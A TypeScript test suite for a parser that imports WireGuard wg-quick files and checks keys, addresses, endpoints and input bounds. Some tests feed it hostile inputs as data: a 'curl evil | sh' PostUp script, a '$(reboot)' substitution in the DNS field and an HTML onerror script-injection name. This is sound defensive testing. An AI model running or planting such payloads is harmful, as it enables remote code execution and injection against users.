import assert from "node:assert/strict";
import {test} from "node:test";
import {parseWgQuick, type Note, type WgFile} from "../src/wgimport.ts";

const key = (letter: string) => letter.repeat(42) + "A=";
const good = `[Interface]\nPrivateKey = ${key("A")}\nAddress = 10.2.0.2/32, fd00::2/128\nDNS = 10.2.0.1\nMTU = 1380\n\n[Peer]\nPublicKey = ${key("E")}\nPresharedKey = ${key("I")}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = Vpn.Example.com:51820\nPersistentKeepalive = 25\n`;
const ok = (text: string) => { const found = parseWgQuick(text); assert.ok("fields" in found, JSON.stringify(found)); return found as WgFile; };
const refused = (text: string) => { const found = parseWgQuick(text); assert.ok(!("fields" in found), "expected a refusal"); return found as Note; };

test("a full file gives exactly the outbound fields", () => {
	const found = ok(good);
	assert.deepEqual(found.fields, {private_key: key("A"), public_key: key("E"), preshared_key: key("I"), addresses: ["10.2.0.2", "fd00::2"], server: "vpn.example.com:51820", mtu: 1380, keepalive_secs: 25});
	assert.deepEqual(found.warnings, []);
	assert.deepEqual(found.dns, ["10.2.0.1"]);
});

test("CRLF, a bare CR, comments, odd spacing and case are read", () => {
	for (const eol of ["\r\n", "\r"]) assert.deepEqual(ok(good.replace(/\n/g, eol)).fields.server, "vpn.example.com:51820");
	const odd = `# top\n  [ interface ]  # why\n\tPRIVATEKEY=${key("A")}   \nAddress =10.2.0.2\n\n\n[PEER]\npublickey = ${key("E")} # peer\nENDPOINT=[2001:db8::1]:443\nallowedips = 0.0.0.0/0\nallowedips = ::/0\n`;
	const found = ok(odd);
	assert.equal(found.fields.server, "[2001:db8::1]:443");
	assert.deepEqual(found.fields.addresses, ["10.2.0.2"]);
	assert.deepEqual(found.warnings, []);
});

test("AllowedIPs that are not the two default routes warn", () => {
	assert.equal(ok(good.replace("0.0.0.0/0, ::/0", "10.0.0.0/8")).warnings[0]!.key, "wg.warn.allowed");
	assert.equal(ok(good.replace("0.0.0.0/0, ::/0", "0.0.0.0/0")).warnings[0]!.key, "wg.warn.allowed");
	assert.equal(ok(good.replace(/AllowedIPs.*\n/, "")).warnings[0]!.key, "wg.warn.allowed");
});

test("unknown keys and sections are ignored with a note, scripts are never read", () => {
	const found = ok(good.replace("MTU = 1380", "PostUp = curl evil | sh\nListenPort = 1\n") + "\n[Extra]\nFoo = bar\n");
	assert.equal(found.notes.find(note => note.key === "wg.note.ignored")!.values!.names, "PostUp, ListenPort, Extra, Foo");
	assert.ok(!JSON.stringify(found.fields).includes("curl"));
	assert.deepEqual(Object.keys(found.fields).sort(), ["addresses", "keepalive_secs", "preshared_key", "private_key", "public_key", "server"]);
});

test("DNS is a note and never a field", () => {
	const found = ok(good);
	assert.equal(found.notes[0]!.key, "wg.note.dns");
	assert.ok(!("dns" in found.fields));
	assert.equal(ok(good.replace("DNS = 10.2.0.1", "DNS = 1.1.1.1, $(reboot), 2606:4700::1111")).dns.join(" "), "1.1.1.1 2606:4700::1111");
});

test("more than one peer or interface is refused", () => {
	const peer = `[Peer]\nPublicKey = ${key("E")}\nEndpoint = b.example.com:1\n`;
	assert.equal(refused(good + "\n" + peer).key, "wg.err.twoPeers");
	assert.equal(refused(good + "\n[Interface]\nPrivateKey = " + key("A") + "\n").key, "wg.err.twoInterfaces");
	assert.equal(refused(good.split("[Peer]")[0]!).key, "wg.err.noPeer");
	assert.equal(refused("[Peer]\n" + good.split("[Peer]")[1]!).key, "wg.err.noInterface");
});

test("bad keys are refused without echoing them", () => {
	for (const bad of ["short", key("A").slice(1), "A".repeat(42) + "B=", "A".repeat(44) + "=", "A".repeat(44), "!".repeat(42) + "A=", key("A") + "A"]) {
		const found = refused(good.replace(key("A"), bad));
		assert.equal(found.key, "wg.err.key");
		assert.ok(!JSON.stringify(found).includes(bad));
	}
	assert.equal(refused(good.replace(key("I"), "nope")).key, "wg.err.key");
	assert.equal(refused(good.replace(key("E"), "")).key, "wg.err.key");
});

test("missing pieces name what is missing", () => {
	assert.deepEqual(refused(good.replace(/PrivateKey.*\n/, "")), {key: "wg.err.missing", values: {name: "PrivateKey"}});
	assert.deepEqual(refused(good.replace(/Address.*\n/, "")), {key: "wg.err.missing", values: {name: "Address"}});
	assert.deepEqual(refused(good.replace(/Endpoint.*\n/, "")), {key: "wg.err.missing", values: {name: "Endpoint"}});
	assert.equal(ok(good.replace(/PresharedKey.*\n/, "")).fields.preshared_key, undefined);
});

test("addresses must be one host address per family", () => {
	assert.equal(refused(good.replace("10.2.0.2/32", "10.2.0.2/24")).key, "wg.err.address");
	assert.equal(refused(good.replace("fd00::2/128", "fd00::2/64")).key, "wg.err.address");
	assert.equal(refused(good.replace("10.2.0.2/32", "300.1.1.1")).key, "wg.err.address");
	assert.equal(refused(good.replace("10.2.0.2/32", "010.2.0.2")).key, "wg.err.address");
	assert.equal(refused(good.replace("fd00::2/128", "10.2.0.3")).key, "wg.err.addressMany");
	assert.equal(refused(good.replace("fd00::2/128", "fd00::2, fd00::3")).key, "wg.err.addressMany");
	assert.equal(refused(good.replace("fd00::2/128", "[fd00::2]")).key, "wg.err.address");
	assert.equal(ok(good.replace("10.2.0.2/32, fd00::2/128", "10.2.0.2\nAddress = fd00::2")).fields.addresses.length, 2);
});

test("endpoint, MTU and keepalive are checked", () => {
	for (const bad of ["vpn.example.com", "vpn.example.com:0", "vpn.example.com:65536", "vpn.example.com:99999999", ":51820", "a b.example.com:1", "fd00::1:51820", "[fd00::1]51820", "999.1.1.1:1", "-x.example.com:1", "evil.com/../:1"]) assert.equal(refused(good.replace("Vpn.Example.com:51820", bad)).key, "wg.err.endpoint", bad);
	assert.equal(refused(good.replace("MTU = 1380", "MTU = 1279")).key, "wg.err.mtu");
	assert.equal(refused(good.replace("MTU = 1380", "MTU = 1501")).key, "wg.err.mtu");
	assert.equal(refused(good.replace("MTU = 1380", "MTU = 12.5")).key, "wg.err.mtu");
	assert.equal(refused(good.replace("MTU = 1380", "MTU = 0x600")).key, "wg.err.mtu");
	assert.equal(refused(good.replace("= 25", "= 3601")).key, "wg.err.keepalive");
	assert.equal(refused(good.replace("= 25", "= -1")).key, "wg.err.keepalive");
	assert.equal(ok(good.replace("= 25", "= off")).fields.keepalive_secs, 0);
	assert.equal(ok(good.replace(/MTU.*\n/, "")).fields.mtu, undefined);
});

test("repeated single keys, stray lines and keys outside a section are refused", () => {
	assert.equal(refused(good.replace("MTU = 1380", "MTU = 1380\nMTU = 1400")).key, "wg.err.twice");
	assert.equal(refused(good + "garbage\n").key, "wg.err.line");
	assert.equal(refused(good + "= value\n").key, "wg.err.line");
	assert.equal(refused(good + "bad key! = 1\n").key, "wg.err.line");
	assert.equal(refused(`PrivateKey = ${key("A")}\n` + good).key, "wg.err.outside");
	assert.equal(refused("").key, "wg.err.noInterface");
});

test("input is bounded", () => {
	assert.equal(refused(good + "#" + "x".repeat(65536)).key, "wg.err.big");
	assert.equal(refused(good + "é".repeat(33000)).key, "wg.err.big");
	assert.equal(refused(good + "\n".repeat(1100)).key, "wg.err.lines");
	assert.equal(refused(good + "#".repeat(3000) + "\n").key, "wg.err.long");
	assert.equal(refused(good.replace("Address = ", "Address = " + "1,".repeat(500) + "10.2.0.2, ")).key, "wg.err.address");
	const lots = ok(good.replace("DNS = 10.2.0.1", Array.from({length: 300}, (_, i) => `DNS = 1.1.1.${i % 250}`).join("\n")));
	assert.ok(lots.dns.length <= 4);
});

test("hostile names are refused, never shown", () => {
	assert.equal(refused(good.replace("MTU = 1380", "<img src=x onerror=alert(1)> = 1")).key, "wg.err.line");
	assert.equal(refused(good.replace("MTU = 1380", "\u202eRTL = 2")).key, "wg.err.line");
	assert.equal(refused(good + "[<b>]\n").key, "wg.err.line");
});
